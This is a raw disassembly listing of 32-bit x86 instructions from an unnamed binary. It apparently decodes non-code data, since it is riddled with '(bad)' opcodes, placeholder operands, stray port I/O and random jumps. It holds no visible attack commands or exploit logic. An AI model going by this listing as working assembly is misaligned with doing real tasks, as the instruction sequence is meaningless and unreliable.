  416ac3:	sub    DWORD PTR [eax+0x8],edx
  416ac6:	loopne 0x416aa4
  416ac8:	xchg   esi,eax
  416ac9:	std    
  416aca:	xchg   BYTE PTR ss:[ecx],ch
  416acd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ace:	push   ds
  416acf:	and    cl,ch
  416ad1:	inc    esi
  416ad2:	inc    ecx
  416ad3:	pop    ebx
  416ad4:	jne    0x416a78
  416ad6:	ret    0x6f70
  416ad9:	push   ebx
  416ada:	pop    ecx
  416adb:	jns    0x416aeb
  416add:	jge    0x416b3a
  416adf:	and    ch,BYTE PTR [esi-0x1e]
  416ae2:	and    ebx,DWORD PTR [edi-0x6424a763]
  416ae8:	addr16 adc esp,edx
  416aeb:	bound  ebp,QWORD PTR [ebx-0x2029b71d]
  416af1:	(bad)  
  416af2:	daa    
  416af3:	xor    cl,BYTE PTR [ecx]
  416af5:	xchg   esi,eax
  416af6:	push   ss
  416af7:	or     eax,0x98b3f4cd
  416afc:	mov    ah,0x68
  416afe:	cmc    
  416aff:	mov    cl,BYTE PTR [ebp+0x4f]
  416b02:	mov    edi,gs
  416b04:	lods   al,BYTE PTR ds:[esi]
  416b05:	push   ebp
  416b06:	add    BYTE PTR [edi+eax*2],bl
  416b09:	push   0x18
  416b0b:	inc    ecx
  416b0c:	ins    BYTE PTR es:[edi],dx
  416b0d:	mov    al,ah
  416b0f:	pop    ebp
  416b10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b11:	iret   
  416b12:	mov    edx,0x4bccb5e8
  416b17:	and    eax,0x709d3fb8
  416b1c:	mov    cl,0xa1
  416b1e:	clc    
  416b1f:	and    ch,BYTE PTR [edi+0x30424bc1]
  416b25:	fldenv [ebx]
  416b27:	push   ds
  416b28:	and    eax,0x86420fd7
  416b2d:	loopne 0x416b0b
  416b2f:	sub    cl,dl
  416b31:	sbb    dh,ah
  416b33:	pop    esi
  416b34:	jae    0x416b7b
  416b36:	mov    al,0xae
  416b38:	popa   
  416b39:	repz cmc 
  416b3b:	inc    esi
  416b3c:	xor    edx,DWORD PTR [ebx]
  416b3e:	ret    0xbf1c
  416b41:	in     eax,0x8d
  416b43:	and    bh,BYTE PTR [ebp+0x79]
  416b46:	dec    ecx
  416b47:	and    al,0x4
  416b49:	sub    edi,DWORD PTR [esi]
  416b4b:	xor    eax,0x3d53322b
  416b50:	xchg   esp,eax
  416b51:	or     ah,BYTE PTR [esi+ebp*2]
  416b54:	xchg   esi,eax
  416b55:	sahf   
  416b56:	imul   ebx
  416b58:	retf   0xfe11
  416b5b:	inc    eax
  416b5c:	in     eax,dx
  416b5d:	fistp  WORD PTR [ebp+0x44839ac2]
  416b63:	ret    
  416b64:	sbb    BYTE PTR [ebx-0x2dec9df7],bh
  416b6a:	cld    
  416b6b:	outs   dx,DWORD PTR ds:[esi]
  416b6c:	xchg   ecx,eax
  416b6d:	fucomi st,st(5)
  416b6f:	shl    BYTE PTR [esi+edx*1],1
  416b72:	rcl    BYTE PTR [eax+0x2bbd5b9c],1
  416b78:	mov    edi,ss
  416b7a:	add    ebx,DWORD PTR [ebp-0x4c3a1515]
  416b80:	ja     0x416b82
  416b82:	imul   edx,DWORD PTR [ebx+0x61a49a9a],0x24b3c614
  416b8c:	xor    BYTE PTR [ebx+0x3a],dh
  416b8f:	adc    BYTE PTR [edi],dl
  416b91:	xlat   BYTE PTR ds:[ebx]
  416b92:	mov    esp,0xdc45cab3
  416b97:	(bad)  
  416b99:	adc    ecx,DWORD PTR [ebx-0x7f]
  416b9c:	shl    BYTE PTR [ebx+eax*4+0x59],cl
  416ba0:	adc    eax,0x892d8523
  416ba5:	mov    al,0x33
  416ba7:	popf   
  416ba8:	ficomp WORD PTR [edx+0x79890e2c]
  416bae:	mov    ds:0x7def7330,al
  416bb3:	dec    edx
  416bb4:	mov    al,0x3a
  416bb6:	xor    eax,0x574b89d3
  416bbb:	mov    ah,0x46
  416bbd:	and    DWORD PTR [esi+ebp*4+0x62713903],ebp
  416bc4:	and    eax,0xb6443b60
  416bc9:	dec    ebx
  416bca:	data16 stc 
  416bcc:	jmp    FWORD PTR [ebx-0x1c]
  416bcf:	lods   al,BYTE PTR ds:[esi]
  416bd0:	sub    al,0xaf
  416bd2:	add    esi,DWORD PTR [edx-0x74]
  416bd5:	jge    0x416beb
  416bd7:	sub    al,ch
  416bd9:	int    0x71
  416bdb:	test   BYTE PTR [ecx+0x15c3b7d4],ch
  416be1:	fcmovb st,st(1)
  416be3:	lea    esp,[eax-0x1c5cea31]
  416be9:	inc    ebp
  416bea:	je     0x416c64
  416bec:	std    
  416bed:	arpl   WORD PTR [edi+0x4dbcb70d],sp
  416bf3:	test   DWORD PTR [ecx],0x8f83d288
  416bf9:	dec    edx
  416bfa:	fnstsw WORD PTR ds:0xf5b630a3
  416c00:	in     eax,0x9c
  416c02:	mov    dh,0x7
  416c04:	ins    BYTE PTR es:[edi],dx
  416c05:	out    0xed,eax
  416c07:	repnz xchg edi,eax
  416c09:	xchg   ebp,eax
  416c0a:	pop    esi
  416c0b:	mov    ecx,DWORD PTR [edx]
  416c0d:	push   cs
  416c0e:	pop    ds
  416c0f:	pushf  
  416c10:	cmp    DWORD PTR [esi-0x190aa87e],esp
  416c16:	call   0x3bc5c93f
  416c1b:	cmp    bl,BYTE PTR [edi-0x2c5753e5]
  416c21:	(bad)  
  416c22:	mov    ?,ebx
  416c24:	aas    
  416c25:	loope  0x416c36
  416c27:	cmp    ebp,ebx
  416c29:	cdq    
  416c2a:	add    DWORD PTR [edi-0x428dce1e],edx
  416c30:	and    eax,0xb905e220
  416c35:	addr16 xor eax,0x468f2f97
  416c3b:	sti    
  416c3c:	cmp    DWORD PTR [eax],edi
  416c3e:	xchg   DWORD PTR [ebx-0x20],esp
  416c41:	mov    ebx,0x53db4d7
  416c46:	push   ss
  416c47:	sahf   
  416c48:	mov    eax,0x63501d58
  416c4d:	lods   eax,DWORD PTR ds:[esi]
  416c4e:	and    al,0x75
  416c50:	leave  
  416c51:	leave  
  416c52:	retf   0x293b
  416c55:	int3   
  416c56:	jbe    0x416c18
  416c58:	sub    BYTE PTR fs:[edi-0x780e6055],cl
  416c5f:	sbb    DWORD PTR [ebp+0xe],ecx
  416c62:	test   DWORD PTR [edx],esp
  416c64:	xchg   esp,eax
  416c65:	adc    al,0x9d
  416c67:	out    0x67,al
  416c69:	int3   
  416c6a:	jl     0x416c54
  416c6c:	dec    esi
  416c6d:	cwde   
  416c6e:	push   edi
  416c6f:	mov    esi,0x56e15a35
  416c74:	in     eax,0x2b
  416c76:	xchg   ebx,eax
  416c77:	pop    ss
  416c78:	(bad)  
  416c79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c7b:	iret   
  416c7c:	adc    bh,BYTE PTR [edi+0x59]
  416c7f:	adc    ebp,edx
  416c81:	inc    BYTE PTR [eax+0x78acd389]
  416c87:	mov    ebx,0x7f7b9db9
  416c8c:	xor    ah,ah
  416c8e:	shr    esi,cl
  416c90:	jo     0x416c56
  416c92:	dec    eax
  416c93:	jmp    0x5425226e
  416c98:	push   esp
  416c99:	mov    cl,0x40
  416c9b:	mov    edi,0xff9dfb53
  416ca0:	push   edi
  416ca1:	or     edx,DWORD PTR [esi-0x49]
  416ca4:	daa    
  416ca5:	or     BYTE PTR [edi-0x6c4f7c39],0x5a
  416cac:	(bad)  
  416cad:	rcl    ah,cl
  416caf:	jns    0x416c88
  416cb1:	mov    esp,0xe4bfc3ea
  416cb6:	adc    BYTE PTR [eax-0x1f],0xc5
  416cba:	sub    DWORD PTR [eax-0x331526e6],edx
  416cc0:	mov    edx,0xecf7d82a
  416cc5:	arpl   cx,bp
  416cc7:	das    
  416cc8:	imul   ebp,DWORD PTR [ebx+0x2284d604],0xffffff93
  416ccf:	sub    BYTE PTR [ecx+ecx*1],dl
  416cd2:	pusha  
  416cd3:	fiadd  WORD PTR [ebx]
  416cd5:	sti    
  416cd6:	xor    eax,0x79a52628
  416cdb:	imul   edx,DWORD PTR [ecx-0x568c9534],0xde694c4b
  416ce5:	cmp    ah,al
  416ce7:	out    0x9d,eax
  416ce9:	call   0x2579deff
  416cee:	pop    ebp
  416cef:	sbb    al,0xb0
  416cf1:	jo     0x416d23
  416cf3:	xor    esp,ebp
  416cf5:	xchg   edx,eax
  416cf6:	mov    ss,WORD PTR [eax+0x4362a14d]
  416cfc:	gs retf 
  416cfe:	sbb    ah,cl
  416d00:	push   cs
  416d01:	test   BYTE PTR ds:0xb6816393,bl
  416d07:	adc    al,0x31
  416d09:	dec    ebx
  416d0a:	push   cs
  416d0b:	push   eax
  416d0c:	(bad)  
  416d0d:	sbb    eax,0x33000b39
  416d12:	gs pop edx
  416d14:	or     al,0xc5
  416d16:	adc    dh,al
  416d18:	jecxz  0x416d68
  416d1a:	in     eax,0x70
  416d1c:	scas   eax,DWORD PTR es:[edi]
  416d1d:	fwait
  416d1e:	xlat   BYTE PTR ds:[ebx]
  416d1f:	aas    
  416d20:	(bad)  
  416d21:	fdiv   DWORD PTR [ecx]
  416d23:	clc    
  416d24:	add    DWORD PTR [ebx-0x47e40637],edi
  416d2a:	cs scas al,BYTE PTR es:[edi]
  416d2c:	and    al,0x79
  416d2e:	inc    ebp
  416d2f:	adc    DWORD PTR [edx+edi*2-0x3b],eax
  416d33:	imul   edx,DWORD PTR [esi+0x3b],0xffffffa1
  416d37:	ins    DWORD PTR es:[edi],dx
  416d38:	popf   
  416d39:	pop    ss
  416d3a:	xchg   esp,eax
  416d3b:	out    dx,al
  416d3c:	aaa    
  416d3d:	sub    edx,esi
  416d3f:	ss loop 0x416d6e
  416d42:	and    edi,DWORD PTR [ebx+ecx*8]
  416d45:	(bad)  
  416d47:	push   ebp
  416d48:	aas    
  416d49:	adc    BYTE PTR [ebx+ebx*1-0x3a],0xab
  416d4e:	xchg   esp,eax
  416d4f:	sub    ch,bl
  416d51:	xchg   ebp,eax
  416d52:	push   eax
  416d53:	out    dx,al
  416d54:	(bad)
  416d57:	jecxz  0x416d13
  416d59:	out    0x6,eax
  416d5b:	mov    eax,0x688693ed
  416d60:	pop    es
  416d61:	cld    
  416d62:	aaa    
  416d63:	jno    0x416d20
  416d65:	sub    BYTE PTR fs:[ecx-0x42],ah
  416d69:	clc    
  416d6a:	sub    dh,BYTE PTR ds:0x624a507d
  416d70:	hlt    
  416d71:	fdiv   st(3),st
  416d73:	cld    
  416d74:	jnp    0x416d29
  416d76:	push   ds
  416d77:	ret    0x34ee
  416d7a:	into   
  416d7b:	jns    0x416d69
  416d7d:	out    dx,eax
  416d7e:	cmp    BYTE PTR [esi-0x3d],dh
  416d81:	cdq    
  416d82:	push   ebx
  416d83:	or     BYTE PTR [esi+0x264af575],cl
  416d89:	xchg   edx,eax
  416d8a:	push   ecx
  416d8b:	jnp    0x416d2e
  416d8d:	aam    0xa2
  416d8f:	add    ecx,ebx
  416d91:	daa    
  416d92:	pop    esi
  416d93:	sub    ch,BYTE PTR [eax+0x75359ec]
  416d99:	ret    0x7f7b
  416d9c:	adc    esi,ebx
  416d9e:	stos   DWORD PTR es:[edi],eax
  416d9f:	pop    edi
  416da0:	les    edx,FWORD PTR [esi+0x3]
  416da3:	or     al,0x8a
  416da5:	xor    DWORD PTR [ebx-0x12f2aee],ecx
  416dab:	int3   
  416dac:	mov    bl,0x1a
  416dae:	test   al,0xd9
  416db0:	cmp    ebp,DWORD PTR [ebx]
  416db2:	cwde   
  416db3:	rol    dl,1
  416db5:	add    al,0x45
  416db7:	adc    esp,0x6171843
  416dbd:	xor    ch,BYTE PTR [ebx-0x6e]
  416dc0:	je     0x416e18
  416dc2:	ins    DWORD PTR es:[edi],dx
  416dc3:	dec    ebp
  416dc4:	ss push cs
  416dc6:	mov    ebp,0xc4f1825
  416dcb:	dec    ecx
  416dcc:	imul   ebp,ecx,0x60
  416dcf:	mov    bl,0x4f
  416dd1:	push   ebx
  416dd2:	test   DWORD PTR [ebx],0x844b65cd
  416dd8:	in     al,dx
  416dd9:	xchg   DWORD PTR [edi+0x5a1fda08],edi
  416ddf:	pop    ecx
  416de0:	inc    esi
  416de1:	sbb    ah,BYTE PTR [ebp-0x65]
  416de4:	(bad)  
  416de5:	test   al,0xdd
  416de7:	pop    ebx
  416de8:	sbb    BYTE PTR [eax+esi*4],0xa2
  416dec:	sub    al,0xa7
  416dee:	aad    0xbb
  416df0:	jmp    0x5a78cdd7
  416df5:	dec    edi
  416df6:	inc    edx
  416df7:	data16 daa 
  416df9:	adc    DWORD PTR [edx+eax*1+0x2e],edi
  416dfd:	cmp    BYTE PTR [ebx+0x59],bl
  416e00:	mov    DWORD PTR [edx+0x5e],eax
  416e03:	mov    ah,0x4a
  416e05:	sbb    DWORD PTR [esi-0x4d5e2a31],eax
  416e0b:	out    dx,eax
  416e0c:	mov    dh,0x2a
  416e0e:	ss push ecx
  416e10:	retf   0x40d4
  416e13:	push   ebp
  416e14:	es pop edx
  416e16:	pop    edx
  416e17:	arpl   WORD PTR [eax-0x16],bx
  416e1a:	clc    
  416e1b:	jl     0x416e28
  416e1d:	aaa    
  416e1e:	xchg   ebx,eax
  416e1f:	mov    ebx,0xd631db31
  416e24:	mov    edx,0xcb02b7ed
  416e29:	iret   
  416e2a:	add    DWORD PTR [edx],eax
  416e2c:	into   
  416e2d:	shl    ch,1
  416e2f:	mov    ebx,0x55a2eaaf
  416e34:	in     eax,0x80
  416e36:	sub    eax,0x665569d8
  416e3b:	fild   QWORD PTR [edi+0x2810637f]
  416e41:	shl    BYTE PTR [ebp-0x50],0x31
  416e45:	cdq    
  416e46:	sub    al,0x91
  416e48:	(bad)  
  416e49:	and    DWORD PTR [ebx+0x20],ecx
  416e4c:	daa    
  416e4d:	shl    BYTE PTR [edx],1
  416e4f:	inc    ebx
  416e50:	pop    edi
  416e51:	or     ebx,DWORD PTR [edx-0x42]
  416e54:	xchg   edx,eax
  416e55:	mov    esi,0x9beff2a8
  416e5a:	add    eax,0x4089d2ea
  416e5f:	mov    edx,0x1043ec1c
  416e64:	mov    bl,0x99
  416e66:	mov    WORD PTR [edi-0x7a836d67],?
  416e6c:	stos   BYTE PTR es:[edi],al
  416e6d:	and    BYTE PTR [ebx],cl
  416e6f:	fcmovb st,st(6)
  416e71:	xor    eax,0xf4357e02
  416e76:	cmp    eax,0x5e782868
  416e7b:	popf   
  416e7c:	jae    0x416e50
  416e7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e7f:	ret    
  416e80:	das    
  416e81:	sub    BYTE PTR [ebp+0xa],0x8f
  416e85:	cld    
  416e86:	out    0x5b,al
  416e88:	sti    
  416e89:	mov    esp,0x260cd9e7
  416e8e:	sbb    esp,edi
  416e90:	jo     0x416f0e
  416e92:	loope  0x416e71
  416e94:	jnp    0x416e9a
  416e96:	fisttp DWORD PTR [ebx]
  416e98:	ret    
  416e99:	sbb    DWORD PTR [esi+0x72],0x1b6c490
  416ea0:	out    dx,al
  416ea1:	outs   dx,DWORD PTR ds:[esi]
  416ea2:	mov    bl,0xb4
  416ea4:	or     BYTE PTR [edx+0x32],dh
  416ea7:	shl    BYTE PTR [eax+edi*4-0x9],0x94
  416eac:	imul   eax,DWORD PTR [eax-0xb],0xe551cdbf
  416eb3:	test   BYTE PTR [edx+0x18b04304],0xe1
  416eba:	and    ecx,ecx
  416ebc:	add    dl,BYTE PTR [eax-0x507b4b36]
  416ec2:	ss ret 
  416ec4:	aam    0x11
  416ec6:	push   ebp
  416ec7:	es int 0x2d
  416eca:	gs push ds
  416ecc:	jmp    0x416e88
  416ece:	or     al,0x88
  416ed0:	scas   al,BYTE PTR es:[edi]
  416ed1:	gs mov edx,0xad92e701
  416ed7:	mov    bl,0x91
  416ed9:	aaa    
  416eda:	pusha  
  416edb:	sbb    bl,BYTE PTR [ebp+0x1e]
  416ede:	or     eax,0xc20be8cb
  416ee3:	adc    eax,0x33f51c24
  416ee8:	test   BYTE PTR [ebx-0x30cc6578],bh
  416eee:	xchg   ebp,eax
  416eef:	dec    esp
  416ef0:	dec    ebp
  416ef1:	add    bl,BYTE PTR [esi+edx*1-0x2d]
  416ef5:	and    DWORD PTR [edx+0x72],0x5c17d4ac
  416efc:	cmp    BYTE PTR [ebx],cl
  416efe:	cmp    dl,BYTE PTR [ebp+0x12983f5d]
  416f04:	xchg   esp,eax
  416f05:	pop    edx
  416f06:	imul   BYTE PTR [esi]
  416f08:	loope  0x416eae
  416f0a:	(bad)  
  416f0c:	pushf  
  416f0d:	sbb    edx,edx
  416f0f:	add    DWORD PTR ds:[edx+0x5e],eax
  416f13:	repz mov ds:0xc2c659f2,eax
  416f19:	and    eax,ebx
  416f1b:	fcomp  QWORD PTR [ebx+0x6b93ca72]
  416f21:	cmc    
  416f22:	jb     0x416f2e
  416f24:	jo     0x416ef5
  416f26:	cwde   
  416f27:	mov    cl,0xb5
  416f29:	mov    cl,0xa4
  416f2b:	mov    edx,0x84011507
  416f30:	aam    0x99
  416f32:	mov    ebx,0x9e0b8fc1
  416f37:	mov    ebp,0x9df6c9
  416f3c:	dec    ecx
  416f3d:	outs   dx,BYTE PTR ds:[esi]
  416f3e:	sahf   
  416f3f:	nop
  416f40:	jmp    0x416ef9
  416f42:	add    DWORD PTR [edx],0x883b1bd1
  416f48:	mov    ds:0xf59714be,al
  416f4d:	and    al,0x9f
  416f4f:	sbb    dh,BYTE PTR [ecx]
  416f51:	jge    0x416f81
  416f53:	mov    edi,0xfb2f4719
  416f58:	adc    edi,esp
  416f5a:	jb     0x416f68
  416f5c:	add    edx,DWORD PTR [ecx]
  416f5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f5f:	push   edx
  416f60:	sub    ebx,DWORD PTR [esp+eax*8-0x279757c5]
  416f67:	sar    ebx,0x5e
  416f6a:	sbb    DWORD PTR [edi],ebx
  416f6c:	in     eax,dx
  416f6d:	in     eax,0x55
  416f6f:	dec    eax
  416f70:	jb     0x416f4d
  416f72:	cmp    eax,ecx
  416f74:	sub    cl,BYTE PTR [eax+0x7e3a1bea]
  416f7a:	fcom   QWORD PTR [edi+0x7a]
  416f7d:	push   ebx
  416f7e:	mov    cl,0xbe
  416f80:	ret    
  416f81:	outs   dx,BYTE PTR ds:[esi]
  416f82:	(bad)  
  416f83:	stos   BYTE PTR es:[edi],al
  416f84:	mov    esi,0x75ce35d0
  416f89:	mov    esp,0xe74bfe23
  416f8e:	movups XMMWORD PTR [ecx],xmm5
  416f91:	xor    dl,BYTE PTR [ebx+ecx*2]
  416f94:	xor    esi,esi
  416f96:	icebp  
  416f97:	outs   dx,BYTE PTR ds:[esi]
  416f98:	sub    BYTE PTR [edx+esi*4+0x27a1cf70],cl
  416f9f:	icebp  
  416fa0:	push   ecx
  416fa1:	pop    eax
  416fa2:	mov    al,0x77
  416fa4:	loop   0x416f4a
  416fa6:	xor    ebp,DWORD PTR [edi-0xa]
  416fa9:	clc    
  416faa:	inc    ebp
  416fab:	push   eax
  416fac:	or     dl,BYTE PTR [edx+0x53fb97c7]
  416fb2:	pop    ds
  416fb3:	fcmovne st,st(4)
  416fb5:	pop    esp
  416fb6:	mov    al,ds:0x9340bdb2
  416fbb:	bound  ebx,QWORD PTR [ecx]
  416fbd:	sahf   
  416fbe:	mov    edx,0xb8438d5d
  416fc3:	inc    ecx
  416fc4:	test   ecx,ebx
  416fc6:	clc    
  416fc7:	into   
  416fc8:	call   0x7285:0x686f564b
  416fcf:	(bad)  
  416fd0:	repnz mov bl,0xec
  416fd3:	clc    
  416fd4:	or     esi,ebx
  416fd6:	sahf   
  416fd7:	retf   0xedb3
  416fda:	mov    dh,0xcd
  416fdc:	(bad)  [esi+ebx*1+0x19e8ff5d]
  416fe3:	sbb    BYTE PTR [eax-0x6b88b669],bl
  416fe9:	je     0x416fcf
  416feb:	out    0x5a,eax
  416fed:	cdq    
  416fee:	adc    DWORD PTR [ebp-0x6f958934],esi
  416ff4:	push   edi
  416ff5:	fbstp  TBYTE PTR [ecx-0x52]
  416ff8:	popa   
  416ff9:	and    BYTE PTR [ecx],al
  416ffb:	xor    al,0xa3
  416ffd:	mov    al,bh
  416fff:	cmp    al,0x46
  417001:	jmp    0x417025
  417003:	lock xchg edi,eax
  417005:	lahf   
  417006:	int    0x68
  417008:	xchg   DWORD PTR [eax+0x8e9fcd6],ebx
  41700e:	jmp    0x524f:0xa5b376e4
  417015:	mov    al,0xb9
  417017:	jb     0x417060
  417019:	iret   
  41701a:	add    al,0xfe
  41701c:	mov    bh,0x4f
  41701e:	push   0x24
  417020:	loopne 0x41701f
  417022:	int3   
  417023:	test   DWORD PTR [edi+0x47],ebp
  417026:	loope  0x417083
  417028:	out    dx,eax
  417029:	shr    DWORD PTR [ecx+0x2f0c4e4d],cl
  41702f:	cmp    eax,0x147e75ec
  417034:	or     eax,0x114c3e67
  417039:	and    ecx,DWORD PTR [edi+ebp*2-0x1]
  41703d:	inc    esi
  41703e:	scas   eax,DWORD PTR es:[edi]
  41703f:	or     al,0x8c
  417042:	push   0x28
  417044:	jmp    0x986:0xf76a5c0a
  41704b:	mov    ch,0x6c
  41704d:	add    bh,BYTE PTR [edi-0x597b1517]
  417053:	sub    al,0x34
  417055:	scas   eax,DWORD PTR es:[edi]
  417056:	fcmove st,st(2)
  417058:	stos   DWORD PTR es:[edi],eax
  417059:	sub    ebx,DWORD PTR [edx-0x13]
  41705c:	mov    al,0xc9
  41705e:	push   esp
  41705f:	and    ecx,DWORD PTR [esi+ebx*4]
  417062:	idiv   BYTE PTR [esi]
  417064:	lds    esi,FWORD PTR [eax+0x7]
  417067:	dec    esi
  417068:	imul   edx,ebp,0xffffffd3
  41706b:	test   BYTE PTR [ebx-0x9b55e79],ch
  417071:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417072:	xchg   DWORD PTR [ebp-0x6ab5a3fc],esi
  417078:	mov    ebx,0x1411596e
  41707d:	pop    ebx
  41707e:	int    0x80
  417080:	xchg   esp,eax
  417081:	mov    dl,0x86
  417083:	mov    WORD PTR [esi+ebp*2],?
  417086:	inc    edi
  417087:	popf   
  417088:	dec    esi
  417089:	and    BYTE PTR [esi],al
  41708b:	cmc    
  41708c:	das    
  41708d:	dec    eax
  41708e:	js     0x417089
  417090:	push   ebp
  417091:	or     eax,0x9be3a989
  417096:	leave  
  417097:	scas   eax,DWORD PTR es:[edi]
  417098:	xor    esi,DWORD PTR [ebx+0x10]
  41709b:	scas   al,BYTE PTR es:[edi]
  41709c:	push   0xffffff98
  41709e:	push   esi
  41709f:	retf   0x71f
  4170a2:	test   BYTE PTR [eax+0x4ed69a4e],dl
  4170a8:	xchg   edi,eax
  4170a9:	ja     0x41703c
  4170ab:	pop    ecx
  4170ac:	retf   
  4170ad:	icebp  
  4170ae:	or     DWORD PTR [eax-0x67],ecx
  4170b1:	mov    esp,0x243381e5
  4170b6:	xor    eax,0x7f9e2c21
  4170bb:	neg    BYTE PTR [edi+0x5]
  4170be:	out    dx,eax
  4170bf:	or     al,0xb4
  4170c1:	test   BYTE PTR [ebx],bl
  4170c3:	shr    DWORD PTR [ebx-0x59c0c902],1
  4170c9:	xor    DWORD PTR [esi+0x46],eax
  4170cc:	and    ch,cl
  4170ce:	stc    
  4170cf:	sbb    eax,0xc4509092
  4170d4:	jg     0x417138
  4170d6:	lock push edx
  4170d8:	pop    esi
  4170d9:	dec    edx
  4170da:	(bad)  
  4170db:	ins    DWORD PTR es:[edi],dx
  4170dc:	daa    
  4170dd:	inc    esp
  4170de:	outs   dx,BYTE PTR ds:[esi]
  4170df:	test   ch,ah
  4170e1:	push   cs
  4170e2:	nop
  4170e3:	aad    0xfc
  4170e5:	push   ds
  4170e6:	inc    ebp
  4170e7:	mov    eax,ds:0xe372717a
  4170ec:	xchg   ebx,eax
  4170ed:	cwde   
  4170ee:	out    0xf,eax
  4170f0:	lock lahf 
  4170f2:	outs   dx,BYTE PTR ds:[esi]
  4170f3:	xor    eax,0x9e775ec5
  4170f8:	cmp    al,0x26
  4170fa:	in     al,0x2f
  4170fc:	daa    
  4170fd:	push   cs
  4170fe:	call   0x34d85e3e
  417103:	test   eax,0xc436c207
  417108:	sub    eax,DWORD PTR [edi-0x33]
  41710b:	shr    DWORD PTR [ecx+0x5ada36ad],1
  417111:	(bad)  
  417113:	fs in  al,dx
  417115:	lds    edx,FWORD PTR [ebx]
  417117:	(bad)  
  417118:	jns    0x41710d
  41711a:	lahf   
  41711b:	ja     0x41715b
  41711d:	push   esp
  41711e:	sbb    ebx,esp
  417120:	pop    ss
  417121:	xor    cl,cl
  417123:	es and ebx,ebp
  417126:	add    ch,BYTE PTR [edi+0x1f861bb5]
  41712c:	mov    al,0x4
  41712e:	mov    cl,0x5a
  417130:	mov    al,0x6d
  417132:	inc    ebx
  417133:	adc    ebp,DWORD PTR [esi-0x4ee48593]
  417139:	and    al,BYTE PTR [ebx-0xa711be1]
  41713f:	mov    dh,0xd9
  417141:	mov    bl,0x5d
  417143:	sahf   
  417144:	test   BYTE PTR [ebx+edi*1],cl
  417147:	pop    esi
  417148:	adc    edi,DWORD PTR [eax-0x6298a9db]
  41714e:	add    DWORD PTR [ebx],0x97262071
  417154:	popa   
  417155:	xchg   edi,eax
  417156:	dec    ecx
  417157:	xchg   ecx,eax
  417158:	jl     0x4171c7
  41715a:	jg     0x41716e
  41715c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41715d:	lock nop
  41715f:	mov    esp,0x3a973571
  417164:	test   DWORD PTR [edx+0x41b0bc95],0x58fdfc18
  41716e:	jp     0x417115
  417170:	jg     0x417182
  417172:	cwde   
  417173:	jl     0x41719c
  417175:	xchg   DWORD PTR [edx-0x36a7a27c],edi
  41717b:	iret   
  41717c:	les    edx,FWORD PTR [ebx]
  41717e:	lahf   
  41717f:	xchg   BYTE PTR [ecx+0x45],cl
  417182:	and    ebx,esp
  417184:	jno    0x417124
  417186:	test   bh,bl
  417188:	sbb    al,0x40
  41718a:	dec    edi
  41718b:	stos   BYTE PTR es:[edi],al
  41718c:	mov    ebp,0x3a19c54b
  417191:	mov    cl,al
  417193:	out    dx,al
  417194:	xchg   edx,eax
  417195:	stc    
  417196:	jg     0x4171d5
  417198:	adc    cl,bl
  41719a:	adc    bh,BYTE PTR [eax-0x1010699]
  4171a0:	adc    esi,DWORD PTR [ecx+ebx*4+0x55cd1afd]
  4171a7:	cmp    esp,DWORD PTR [ebx+0x2f]
  4171aa:	mov    esp,DWORD PTR [ebx-0xefda89e]
  4171b0:	pop    edi
  4171b1:	fdivr  DWORD PTR [esi+esi*1+0x6aeb7359]
  4171b8:	adc    eax,0xc0d1088b
  4171bd:	fs stos BYTE PTR es:[edi],al
  4171bf:	push   es
  4171c0:	xchg   ebx,eax
  4171c1:	pop    ebx
  4171c2:	push   edi
  4171c3:	sbb    DWORD PTR [edi+0x68],ecx
  4171c6:	pop    edx
  4171c7:	fs sahf 
  4171c9:	out    0xd4,eax
  4171cb:	cdq    
  4171cc:	pop    ss
  4171cd:	into   
  4171ce:	and    BYTE PTR [edx-0x71],0x84
  4171d2:	sar    esi,cl
  4171d4:	mov    ch,0x21
  4171d6:	pop    edi
  4171d7:	mov    bl,0x1d
  4171d9:	mov    edx,0xe2912fcf
  4171de:	std    
  4171df:	add    dl,ah
  4171e1:	outs   dx,BYTE PTR ds:[esi]
  4171e2:	in     eax,0x18
  4171e4:	inc    esi
  4171e5:	test   bh,dl
  4171e7:	inc    eax
  4171e8:	cld    
  4171e9:	adc    edx,DWORD PTR [edi]
  4171eb:	mov    ch,0x96
  4171ed:	mov    ah,0xd9
  4171ef:	fsubr  DWORD PTR [edi]
  4171f1:	iret   
  4171f2:	push   ss
  4171f3:	xchg   esp,eax
  4171f4:	lods   al,BYTE PTR ds:[esi]
  4171f5:	pavgw  mm2,mm1
  4171f8:	mov    dl,0x66
  4171fa:	sbb    BYTE PTR [eax],0xaa
  4171fd:	std    
  4171fe:	in     eax,dx
  4171ff:	xchg   edx,eax
  417200:	sub    DWORD PTR [ebx],0xa4647d47
  417206:	fmul   QWORD PTR [edx]
  417208:	inc    edx
  417209:	std    
  41720a:	pop    es
  41720b:	scas   eax,DWORD PTR es:[edi]
  41720c:	cwde   
  41720d:	sub    eax,0x570cfedc
  417212:	cmp    eax,0x5ccabd0
  417217:	jo     0x4171ab
  417219:	mov    eax,0x3b800bbc
  41721e:	je     0x417209
  417220:	aad    0x86
  417222:	cld    
  417223:	add    ecx,edx
  417225:	jg     0x41728c
  417227:	mov    WORD PTR [ebp+0x58],?
  41722a:	das    
  41722b:	arpl   bx,sp
  41722d:	sti    
  41722e:	out    dx,al
  41722f:	or     BYTE PTR [ecx+edi*1-0x7dde4dce],0x7a
  417237:	scas   eax,DWORD PTR es:[edi]
  417238:	dec    ecx
  417239:	gs fmulp st(0),st
  41723c:	imul   esi,DWORD PTR [ebp-0x4b497600],0xe85c267a
  417246:	jmp    0x9354:0x70195006
  41724d:	pop    ebp
  41724e:	mov    WORD PTR [edx-0x14],?
  417251:	xlat   BYTE PTR ds:[ebx]
  417252:	imul   ecx,DWORD PTR [eax-0x50],0x4b89e4c8
  417259:	je     0x41721e
  41725b:	xchg   BYTE PTR [ecx+0x76],dl
  41725e:	xchg   ecx,eax
  41725f:	out    dx,eax
  417260:	repnz icebp 
  417262:	jecxz  0x4172d1
  417264:	or     BYTE PTR [edi],0x9a
  417267:	sti    
  417268:	mov    ds:0x7272ccce,eax
  41726d:	push   esi
  41726e:	xor    DWORD PTR ds:0xa89287bd,esi
  417274:	div    DWORD PTR [ecx+0x7b94e5f9]
